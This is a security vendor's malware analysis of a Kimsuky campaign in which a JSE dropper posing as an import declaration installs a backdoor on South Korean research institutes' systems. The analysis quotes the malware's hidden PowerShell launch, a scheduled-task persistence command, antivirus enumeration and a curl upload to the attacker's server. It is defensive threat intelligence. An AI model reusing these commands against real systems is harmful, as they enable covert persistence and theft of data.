# Reference for threat actor for "Kimsuky, Velvet Chollima"

**Title**: Kimsuky Targets South Korean Research Institutes with Fake Import Declaration - ASEC BLOG

**Source**: https://asec.ahnlab.com/en/59387/

## Content















Kimsuky Targets South Korean Research Institutes with Fake Import Declaration - ASEC BLOG



































































 

Malware Information
AhnLab Detection
Statistics
Response Guide
AhnLab
 














Posted By kwonxx  , November 30, 2023 

Kimsuky Targets South Korean Research Institutes with Fake Import Declaration 
AhnLab Security Emergency response Center (ASEC) has recently identified that the Kimsuky threat group is distributing a malicious JSE file disguised as an import declaration to research institutes in South Korea. The threat actor ultimately uses a backdoor to steal information and execute commands.
The file name of the dropper disguised as an import declaration is as follows.

Import Declaration_Official Stamp Affixed.jse

The file contains an obfuscated PowerShell script, a Base64-encoded backdoor file, and a legitimate PDF file.

Figure 1. Obfuscated JSE file content
A legitimate PDF file is saved under the file name ‘Import Declaration.PDF’ and automatically executed by the PowerShell script. This file contains the attack target’s information. Creating and executing a legitimate PDF file is likely done to prevent users from recognizing that a malicious backdoor file is being executed in the process.

Figure 2. Decoy file (Import Declaration.PDF)
In the background, a backdoor is created in the %ProgramData% path under the file name ‘vuVvMKg.i3IO’, and the malware is run using rundll32.exe.

powershell.exe -windowstyle hidden rundll32.exe ProgramData\\vuVuMKg.i3IO UpdateSystem

The malware copies itself into the %ProgramData% and %Public% paths under the file name ‘IconCache.db’ for persistence before registering itself to the task scheduler.

cmd.exe /c schtasks /create /tn iconcache /tr “rundll32.exe C:\Programdata\IconCache.db UpdateSystem /sc onlogon /rl highest /f

To exfiltrate system information, the backdoor uses the wmic command to check the anti-malware status of the attack target and collects network information through the ipconfig command.

cmd.exe /U /c wimc /namespace:\\root\securitycenter2 path antivirusproduct get displayname > vaccine.txt
ipconfig /all

Afterwards, information such as the host name, user name, and OS information is collected. For the malware to avoid detection, it encodes the command execution results and sends them to the C2.

Figure 3. Collected system information

Figure 4. Information being encoded and transmitted
Also, the following commands (including system information exfiltration) are run, behaving as a backdoor in the affected system. Additionally, the curl tool is used to upload information to the C2 server.

getinfo: System information
die: Terminate
where: Execution path
run: Run certain files and commands
curl -k -F “fileToUpload=@%s” -F “id=%S” %s

Because the bait file is also run, users cannot recognize that their systems are infected by malware. As these types of malware mainly attack specific targets, users should refrain from running attachments in emails sent from unknown sources.
[File Detection]

Dropper/JS.Generic (2023.11.16.02)
Backdoor/Win.Nikidoor (2023.11.15.03)

[IOC]

MD5d2335df6d17fc7c2a5d0583423e39ff8d6abeeb469e2417bbcd3c122c06ba099
C2hxxp://rscnode.dothome.co[.]kr/index.phphxxp://rscnode.dothome.co[.]kr/upload.php

Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.


Categories:Malware Information 
Tagged as:backdoor,Kimsuky 




Personal Information Sales Used as Bait to Distribute Malware 

Ransomware Attacks Using RDP as the Attack Vector (Detected by EDR) 







5
2
votes
Article Rating

 





 Subscribe




 Login 




Notify of 


new follow-up comments
new replies to my comments








 







 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 










 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 






42 Comments                    









 Inline Feedbacks                    
View all comments











Kimsuky targets South Korean institutes with malicious JSE file



    2 months ago













[…] Cybersecurity researchers from AhnLab Security Emergency Response Center (ASEC) have exposed this recent attack tactic by Kimsuky. The threat actor also deploys a sophisticated backdoor to steal sensitive information and execute malicious commands on the compromised systems. […]






0






Reply













N. Korean Kimsuky Focusing on South Korean Analysis Institutes with Backdoor Assaults - artificialintelligence360



    2 months ago













[…] to steal info and execute instructions,» the AhnLab Safety Emergency Response Middle (ASEC) mentioned in an evaluation posted final […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Bizi News



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targets South Korean Research Institutes with Backdoor Attacks - Mrx tech insider



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) SAYS in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Cyber Social Hub



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Tempyx Blog



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - TechBuzz



    2 months ago













[…] to steal info and execute instructions,” the AhnLab Safety Emergency Response Middle (ASEC) said in an evaluation posted final […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Kilguard | News, Reviews, & AI



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an examination posted final […]






0






Reply













Le Kimsuky nord-coréen cible des instituts de recherche sud-coréens avec des attaques dérobées - Teknomers Nouvelles



    2 months ago













[…] exécuter des commandes », a déclaré l’AhnLab Security Emergency Response Center (ASEC). dit dans une analyse publiée la semaine […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - primez.online



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Securitydone



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Vived Solutions Ltd



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Cyber Security



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Tech News and Articles



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Tech News



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - SwapUpdate



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Koreli Kimsuky, Arka Kapı Saldırılarıyla Güney Kore Araştırma Enstitülerini Hedef Alıyor - Dünyadan Güncel Teknoloji Haberleri | Teknomers



    2 months ago













[…] sonuçta bilgi çalmak ve komutları yürütmek için bir arka kapı kullanıyor” dedi. söz konusu Geçen hafta yayınlanan bir […]






0






Reply













Kimsuky norcoreano ataca a institutos de investigación de Corea del Sur con ataques por la puerta trasera - Teknomers Noticias



    2 months ago













[…] y ejecutar comandos», afirma el Centro de Respuesta a Emergencias de Seguridad de AhnLab (ASEC) dicho en un análisis publicado la semana […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Cyber Defense Advisors



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Flyytech.com



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Tech Investor News



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Secuirty This Day



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Investor Beam



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – InfoSec Today



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Source:thehackernews.com - CISO2CISO.COM & CYBER SECURITY GROUP



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Cyber Sector – CS



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Newest Tech Trends



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korea’s Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks – Secuirty This Day



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korea's Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Cyber Defense Advisors



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korean Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Digital Creations LLC



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













Kimsuky spia la Corea del Sud - Matrice Digitale



    2 months ago













[…] Il gruppo di minaccia nordcoreano noto come Kimsuky è stato osservato mentre prendeva di mira istituti di ricerca in Corea del Sud come parte di una campagna di spear-phishing, con l’obiettivo finale di distribuire backdoor sui sistemi compromessi come denunciato da AhnLab. […]






0






Reply













N. Korea's Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - LA Times Now



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korea's Kimsuky Concentrating on South Korean Analysis Institutes with Backdoor Assaults - Healthy Testy & Delicious Food Receipie, Sceience Technology & Reaserch Reports Website



    2 months ago













[…] to steal info and execute instructions,” the AhnLab Safety Emergency Response Heart (ASEC) mentioned in an evaluation posted final […]






0






Reply













N. Korea's Kimsuky Focusing on South Korean Analysis Institutes with Backdoor Assaults -



    2 months ago













[…] to steal data and execute instructions,” the AhnLab Safety Emergency Response Heart (ASEC) mentioned in an evaluation posted final […]






0






Reply













N. Korea's Kimsuky Focusing on South Korean Analysis Institutes with Backdoor Assaults - Sale & Buy Vehicles



    2 months ago













[…] to steal data and execute instructions,” the AhnLab Safety Emergency Response Middle (ASEC) stated in an evaluation posted final […]






0






Reply













N. Korea's Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Cyber News



    2 months ago













[…] information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korea's Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - Digital Creations LLC



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last […]






0






Reply













N. Korea's Kimsuky Targeting South Korean Research Institutes with Backdoor Attacks - The Network Company | Cyber Security | IT Services | Network Security



    2 months ago













[…] steal information and execute commands,” the AhnLab Security Emergency Response Center (ASEC) said in an analysis posted last week.The attack chains commence with an import declaration lure […]






0






Reply













IT Security Weekend Catch Up – December 17, 2023 – BadCyber



    1 month ago













[…] Kimsuky targets South Korean research institutes with fake import declaration […]






0






Reply













Weekendowa Lektura: odcinek 550 [2023-12-17]. Bierzcie i czytajcie | Zaufana Trzecia Strona



    1 month ago













[…] Kimsuky uzyskała zdalny dostęp do poufnych badań Korei Południowej […]






0






Reply













Rewterz Threat Alert – Kimsuky APT Uses Backdoor Attacks on South Korean Research Institutes – Active IOCs - F1TYM1



    1 month ago













[…] “A legitimate PDF file is saved under the file name ‘Import Declaration.PDF’ and automatically executed by the PowerShell script. This file contains the attack target’s information,” the researchers said. […]






0






Reply




 













Archives Archives

Select Month
 February 2024 
 January 2024 
 December 2023 
 November 2023 
 October 2023 
 September 2023 
 August 2023 
 July 2023 
 June 2023 
 May 2023 
 April 2023 
 March 2023 
 February 2023 
 January 2023 
 December 2022 
 November 2022 
 October 2022 
 September 2022 
 August 2022 
 July 2022 
 June 2022 
 May 2022 
 April 2022 
 March 2022 
 February 2022 
 January 2022 
 December 2021 
 November 2021 
 October 2021 
 September 2021 
 August 2021 
 July 2021 
 June 2021 
 May 2021 
 April 2021 
 March 2021 
 February 2021 
 January 2021 
 December 2020 
 November 2020 
 September 2020 
 August 2020 
 July 2020 
 June 2020 
 May 2020 
 April 2020 
 March 2020 
 February 2020 
 December 2019 
 November 2019 
 October 2019 
 September 2019 
 August 2019 
 June 2019 
 May 2019 
 April 2019 
 March 2019 
 February 2019 
 January 2019 
 November 2018 
 July 2018 
 April 2018 
 February 2018 


FOLLOW US


LinkedIn   


X   


RSS Feed   









footer(en) 220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, Korea | Privacy & Security© AhnLab, Inc. All rights reserved.family site


한국 (한국어)
Global (English)
日本 (日本語)
 




wpDiscuzInsert 



















































































































































































































